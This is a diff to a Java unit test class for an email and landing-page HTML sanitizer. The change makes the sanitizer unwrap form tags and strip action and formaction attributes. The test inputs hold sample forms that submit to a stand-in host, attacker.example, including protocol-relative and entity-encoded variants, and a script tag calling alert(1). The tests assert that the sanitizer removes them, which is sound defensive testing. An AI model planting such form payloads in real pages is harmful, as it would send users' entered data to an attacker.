@@ -59,8 +59,8 @@ class EmailContentValidationServiceTest {
                 </form>
                 """);
 
-        assertTrue(sanitized.contains("<form method=\"post\">"));
         assertTrue(sanitized.contains("<button>Go</button>"));
+        assertFalse(sanitized.contains("<form"));
         assertFalse(sanitized.toLowerCase().contains("javascript:"));
         assertFalse(sanitized.contains("action="));
         assertFalse(sanitized.contains("formaction="));
@@ -74,8 +74,8 @@ class EmailContentValidationServiceTest {
                 </form>
                 """);
 
-        assertTrue(sanitized.contains("<form method=\"post\">"));
         assertTrue(sanitized.contains("<button>Go</button>"));
+        assertFalse(sanitized.contains("<form"));
         assertFalse(sanitized.contains("https://attacker.example"));
         assertFalse(sanitized.contains("action="));
         assertFalse(sanitized.contains("formaction="));
@@ -84,14 +84,60 @@ class EmailContentValidationServiceTest {
     @Test
     void removesRelativeActionAndFormactionOnLandingPagesUntilEndpointPolicyExists() {
         String sanitized = service.sanitizeLandingPage("""
-                <form action="/api/public/landing-pages/submit" method="post">
-                    <button formaction="/api/public/landing-pages/override">Go</button>
+                <form action="/__blocked-landing-form-submit__" method="post">
+                    <button formaction="/__blocked-landing-form-submit__/override">Go</button>
                 </form>
                 """);
 
-        assertTrue(sanitized.contains("<form method=\"post\">"));
         assertTrue(sanitized.contains("<button>Go</button>"));
-        assertFalse(sanitized.contains("/api/public/landing-pages"));
+        assertFalse(sanitized.contains("<form"));
+        assertFalse(sanitized.contains("/__blocked-landing-form-submit__"));
+        assertFalse(sanitized.contains("action="));
+        assertFalse(sanitized.contains("formaction="));
+    }
+
+    @Test
+    void removesProtocolRelativeActionAndFormactionOnLandingPages() {
+        String sanitized = service.sanitizeLandingPage("""
+                <form action="//attacker.example/collect" method="post">
+                    <button formaction="//attacker.example/override">Go</button>
+                </form>
+                """);
+
+        assertTrue(sanitized.contains("<button>Go</button>"));
+        assertFalse(sanitized.contains("<form"));
+        assertFalse(sanitized.contains("//attacker.example"));
+        assertFalse(sanitized.contains("action="));
+        assertFalse(sanitized.contains("formaction="));
+    }
+
+    @Test
+    void removesEncodedActionAndFormactionOnLandingPages() {
+        String sanitized = service.sanitizeLandingPage("""
+                <form action="https&#x3a;//attacker.example/collect" method="post">
+                    <button formaction="&#x2f;&#x2f;attacker.example/override">Go</button>
+                </form>
+                """);
+
+        assertTrue(sanitized.contains("<button>Go</button>"));
+        assertFalse(sanitized.contains("<form"));
+        assertFalse(sanitized.contains("attacker.example"));
+        assertFalse(sanitized.contains("action="));
+        assertFalse(sanitized.contains("formaction="));
+    }
+
+    @Test
+    void landingPageFormsRemainInertWithoutControlledEndpoint() {
+        String sanitized = service.sanitizeLandingPage("""
+                <form method="post">
+                    <input name="email" type="email">
+                    <button type="submit">Go</button>
+                </form>
+                """);
+
+        assertTrue(sanitized.contains("<input name=\"email\" type=\"email\">"));
+        assertTrue(sanitized.contains("<button type=\"submit\">Go</button>"));
+        assertFalse(sanitized.contains("<form"));
         assertFalse(sanitized.contains("action="));
         assertFalse(sanitized.contains("formaction="));
     }
@@ -134,11 +180,11 @@ class EmailContentValidationServiceTest {
     }
 
     @Test
-    void landingPageSanitizerAllowsFormsButRemovesScripts() {
+    void landingPageSanitizerUnwrapsFormsButKeepsControls() {
         String sanitized = service.sanitizeLandingPage("<form><input name=\"email\"><script>alert(1)</script></form>");
 
-        assertTrue(sanitized.contains("<form>"));
         assertTrue(sanitized.contains("<input"));
+        assertFalse(sanitized.contains("<form"));
         assertFalse(sanitized.contains("<script"));
     }
 }
